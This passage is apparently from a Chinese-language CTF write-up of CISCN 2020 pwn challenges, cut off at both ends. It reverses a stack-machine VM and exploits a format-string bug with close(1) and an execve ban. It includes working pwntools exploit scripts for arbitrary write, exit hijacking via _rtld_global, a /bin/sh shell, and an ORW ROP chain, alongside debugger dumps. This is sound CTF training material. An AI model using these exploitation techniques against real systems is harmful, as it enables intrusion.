class="line">        v8 = m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] | m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">        m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = v8;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] ^ m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">        m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = v9;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xB</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = ~m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] &lt;&lt; m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">        m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = v10;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] &gt;&gt; m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">        m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = v11;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &gt; <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        m-&gt;s_size_2 -= <span class="number">8L</span>L;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = *(_QWORD *)&amp;m-&gt;c_ptr[m-&gt;times + <span class="number">1</span>];</span><br><span class="line">        m-&gt;times += <span class="number">8L</span>L;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">LABEL_56:</span><br><span class="line">        ++m-&gt;times;</span><br><span class="line">        result = <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>稍微好看了一点。</p>
<p>虚拟机功能大概就是</p>
<table>
<thead>
<tr>
<th></th>
<th>k = size_2&gt;&gt;3</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>return</td>
</tr>
<tr>
<td>1</td>
<td>s[k] = d[s[k]/8]</td>
</tr>
<tr>
<td>2</td>
<td>d[s[k]/8] = s[k+1], k += 2</td>
</tr>
<tr>
<td>3</td>
<td>s[k+1] = s[k] + s[k+1], k+=1</td>
</tr>
<tr>
<td>4</td>
<td>s[k+1] = s[k] - s[k+1], k+=1</td>
</tr>
<tr>
<td>5</td>
<td>s[k+1] = s[k] * s[k+1], k+=1</td>
</tr>
<tr>
<td>6</td>
<td>s[k+1] = s[k] / s[k+1], k+=1</td>
</tr>
<tr>
<td>7</td>
<td>s[k+1] = s[k] % s[k+1], k+=1</td>
</tr>
<tr>
<td>8</td>
<td>s[k+1] = s[k] &amp; s[k+1], k+=1</td>
</tr>
<tr>
<td>9</td>
<td>s[k+1] = s[k] | s[k+1], k+=1</td>
</tr>
<tr>
<td>a</td>
<td>s[k+1] = s[k] ^ s[k+1], k+=1</td>
</tr>
<tr>
<td>b</td>
<td>s[k] = ~s[k]</td>
</tr>
<tr>
<td>c</td>
<td>s[k+1] = s[k] &lt;&lt; s[k+1], k+=1</td>
</tr>
<tr>
<td>d</td>
<td>s[k+1] = s[k] &gt;&gt; s[k+1], k+=1</td>
</tr>
<tr>
<td>e</td>
<td>s[k-1] = c[times + 1], k -= 1,  times += 8</td>
</tr>
<tr>
<td>f</td>
<td>k += 1</td>
</tr>
</tbody></table>
<p>利用12e三个功能可以任意地址读写。</p>
<p>gdb动调</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">          <span class="number">0x400000</span>           <span class="number">0x402000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /<span class="built_in">home</span>/tinia/ciscn2020/pwn2/StackMachine</span><br><span class="line">          <span class="number">0x601000</span>           <span class="number">0x602000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /<span class="built_in">home</span>/tinia/ciscn2020/pwn2/StackMachine</span><br><span class="line">          <span class="number">0x602000</span>           <span class="number">0x603000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /<span class="built_in">home</span>/tinia/ciscn2020/pwn2/StackMachine</span><br><span class="line">         <span class="number">0x1522000</span>          <span class="number">0x1543000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7f681bb41000</span>     <span class="number">0x7f681bd01000</span> r-xp   <span class="number">1</span>c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7f681bd01000</span>     <span class="number">0x7f681bf01000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7f681bf01000</span>     <span class="number">0x7f681bf05000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7f681bf05000</span>     <span class="number">0x7f681bf07000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7f681bf07000</span>     <span class="number">0x7f681bf0b000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7f681bf0b000</span>     <span class="number">0x7f681bf31000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7f681c013000</span>     <span class="number">0x7f681c116000</span> rw-p   <span class="number">103000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7f681c130000</span>     <span class="number">0x7f681c131000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7f681c131000</span>     <span class="number">0x7f681c132000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7f681c132000</span>     <span class="number">0x7f681c133000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffc8cb7a000</span>     <span class="number">0x7ffc8cb9b000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7ffc8cbf4000</span>     <span class="number">0x7ffc8cbf7000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffc8cbf7000</span>     <span class="number">0x7ffc8cbf9000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure></div>

<p>mmap申请💧内存在ld上方。因为读写操作的下标👊都是unsigned的，所以只能打到ld。考虑劫持exit。</p>
<p>打rtld_global的<em>\</em>rtld_lock_unlock_recursive或__rtld_lock_lock_recursive。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line">elf = ELF(<span class="string">'./StackMachine'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./StackMachine'</span>)</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./StackMachine'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AllocStack</span><span class="params">(sz)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"stack size &gt;"</span>,str(sz))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AllocData</span><span class="params">(sz,data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"data size &gt;"</span>,str(sz))</span><br><span class="line">    p.recvuntil(<span class="string">"initial data &gt;"</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AllocCode</span><span class="params">(sz,code)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"code size &gt;"</span>,str(sz))</span><br><span class="line">    p.recvuntil(<span class="string">"tial code &gt;"</span>)</span><br><span class="line">    p.sendline(code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    AllocStack(<span class="number">0xff000</span>)</span><br><span class="line">    main_addr = <span class="number">0x401346</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x400b9e\nb* 0x400a7a'</span>)</span><br><span class="line">    AllocData(<span class="number">0x23000</span>,p64(<span class="number">0x3858f0</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    payload = p8(<span class="number">0xe</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload += p8(<span class="number">1</span>)</span><br><span class="line">    payload += p8(<span class="number">0xe</span>)+p64(<span class="number">0x14af38</span>)</span><br><span class="line">    payload += p8(<span class="number">1</span>)</span><br><span class="line">    payload += p8(<span class="number">4</span>)</span><br><span class="line">    payload += p8(<span class="number">0xe</span>)+p64(<span class="number">0x14af38</span>)</span><br><span class="line">    payload += p8(<span class="number">2</span>)</span><br><span class="line">    payload += p8(<span class="number">0xe</span>)+<span class="string">"/bin/sh\x00"</span></span><br><span class="line">    payload += p8(<span class="number">0xe</span>)+p64(<span class="number">0x14af38</span><span class="number">-0x600</span>)</span><br><span class="line">    payload += p8(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#payload += p8(0xe)+p64(main_addr)</span></span><br><span class="line">    <span class="comment">#payload += p8(0xe)+p64(0x23000-8)</span></span><br><span class="line">    <span class="comment">#payload += p8(2)</span></span><br><span class="line">    <span class="comment">#payload += p8(0xe)+p64(main_addr)</span></span><br><span class="line"></span><br><span class="line">    AllocCode(<span class="number">0x1000</span>,payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure></div>


<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>比赛时打开看看无限循环格式化字符串。感觉还挺💧的。</p>
<p>仔细看一👀，close(1)</p>
<p>再仔细一看，ban了system</p>
<p>玩你🐎！</p>
<p>……</p>
<p>但该复现还是要复现。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mains</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = s1;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Oh! I hear you love Ciscn2020, so I have a gift for you!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Gift: %p\n"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Come in quickly, I will close the door."</span>);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strncmp</span>(s1, <span class="string">"Ciscn20"</span>, <span class="number">7u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    getcontent();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getcontent</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  my_read(s1, <span class="number">0x120</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>程序主要流程如上所示。close(1)，ban了execve，想把_IO_2_1_stdout的fileno改成2，泄露libc后orw。</p>
<p>但printf时栈中数据如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">0x40</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rbp rsp  <span class="number">0x7fffffffdd40</span> —▸ <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x555555554ff0</span> ◂— push   r15</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│          <span class="number">0x7fffffffdd48</span> —▸ <span class="number">0x555555554f96</span> ◂— mov    edx, <span class="number">7</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│          <span class="number">0x7fffffffdd50</span> —▸ <span class="number">0x555555554a90</span> ◂— <span class="keyword">xor</span>    ebp, ebp</span><br><span class="line">03:0018│          0x7fffffffdd58 —▸ 0x555555756040 (__bss_start+48) ◂— 'ciscn20111'</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│          <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x555555554ff0</span> ◂— push   r15</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│          <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x555555554fe4</span> ◂— mov    eax, <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│          <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x555555554ff0</span> ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│          <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x7ffff77e1840</span> (__libc_start_main+<span class="number">240</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│          <span class="number">0x7fffffffdd80</span> ◂— <span class="number">0x1</span></span><br><span class="line">09:0048│          0x7fffffffdd88 —▸ 0x7fffffffde58 —▸ 0x7fffffffe1ff ◂— '/home/tinia/ciscn2020/pwn3/anti'</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│          <span class="number">0x7fffffffdd90</span> ◂— <span class="number">0x1f7ffcca0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│          <span class="number">0x7fffffffdd98</span> —▸ <span class="number">0x555555554fb8</span> ◂— push   rbp</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│          <span class="number">0x7fffffffdda0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│          <span class="number">0x7fffffffdda8</span> ◂— <span class="number">0xc870a45ae303625a</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│          <span class="number">0x7fffffffddb0</span> —▸ <span class="number">0x555555554a90</span> ◂— <span class="keyword">xor</span>    ebp, ebp</span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│          <span class="number">0x7fffffffddb8</span> —▸ <span class="number">0x7fffffffde50</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│          <span class="number">0x7fffffffddc0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│          <span class="number">0x7fffffffddd0</span> ◂— <span class="number">0x9d25f10fc7e3625a</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│          <span class="number">0x7fffffffddd8</span> ◂— <span class="number">0x9d25e00c5313625a</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│          <span class="number">0x7fffffffdde0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">17:00b8│          0x7fffffffddf8 —▸ 0x7fffffffde68 —▸ 0x7fffffffe21f ◂— 'XDG_VTNR=7'</span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│          <span class="number">0x7fffffffde00</span> —▸ <span class="number">0x7ffff7ffe168</span> —▸ <span class="number">0x555555554000</span> ◂— jg     <span class="number">0x555555554047</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│          <span class="number">0x7fffffffde08</span> —▸ <span class="number">0x7ffff7de780b</span> (_dl_init+<span class="number">139</span>) ◂— jmp    <span class="number">0x7ffff7de77e0</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│          <span class="number">0x7fffffffde10</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│          <span class="number">0x7fffffffde20</span> —▸ <span class="number">0x555555554a90</span> ◂— <span class="keyword">xor</span>    ebp, ebp</span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│          <span class="number">0x7fffffffde28</span> —▸ <span class="number">0x7fffffffde50</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">00f</span>0│          <span class="number">0x7fffffffde30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│          <span class="number">0x7fffffffde38</span> —▸ <span class="number">0x555555554ab9</span> ◂— hlt    </span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│          <span class="number">0x7fffffffde40</span> —▸ <span class="number">0x7fffffffde48</span> ◂— <span class="number">0x1c</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│          <span class="number">0x7fffffffde48</span> ◂— <span class="number">0x1c</span></span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│ r13      <span class="number">0x7fffffffde50</span> ◂— <span class="number">0x1</span></span><br><span class="line">23:0118│          0x7fffffffde58 —▸ 0x7fffffffe1ff ◂— '/home/tinia/ciscn2020/pwn3/anti'</span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│          <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line">25:0128│          0x7fffffffde68 —▸ 0x7fffffffe21f ◂— 'XDG_VTNR=7'</span><br></pre></td></tr></table></figure></div>

<p>听说比赛时做出来的老哥是直接把__libc_start_main+240爆破3位改成_IO_2_1_stdout+112。有1/4096的概率</p>
<p>赛后看了别人的思路，rsp上方有残留的IO指针，将返回地址改为start，调用__libc_start_main会将栈抬高一大截，但如果直接返回到start的话恰好会将IO指针给覆盖了，所以要先调用其他函数来抬一下栈</p>
<p>%hn写入大小不超过0x2000，所以爆破出的概率是1/8 * 1/16 == 1/128</p>
<p>有了泄露后其他的就好办了。栈劫持到bss上orw即可。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">libc =ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'anti'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">prdi = libc.search(asm('pop rdi\nret')).next()</span></span><br><span class="line"><span class="string">prsi = libc.search(asm('pop rsi\nret')).next()</span></span><br><span class="line"><span class="string">prdx = 